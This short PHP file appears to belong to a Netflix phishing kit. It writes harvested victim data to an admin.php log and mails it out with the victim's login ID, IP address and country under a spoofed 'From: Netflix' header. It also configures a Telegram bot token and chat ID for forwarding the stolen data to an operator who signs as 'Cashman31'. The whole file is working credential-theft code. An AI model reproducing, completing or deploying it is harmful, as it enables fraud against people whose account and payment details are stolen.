<?php

$yourmail  = '';

$f = fopen("../../admin.php", "a");
	fwrite($f, $msgbank);

$subject  = " ".$_SESSION['iduserLoginId']." / ".$_SERVER['REMOTE_ADDR']." / ".$_SESSION['country1']." ";
$headers .= "From: Netflix" . "\r\n";
mail($yourmail, $subject, $yagmail, $headers);

/**Add Your Api Telegram Token Bellow : **/
$botToken="5337481738:AAGEfKoa858gnMH9_Og8dqXH7uldManQn70";
$chatId="2094460569";  

$Our_Name = "Cashman31" ; 

$Name_page = "Netflix" ;



?>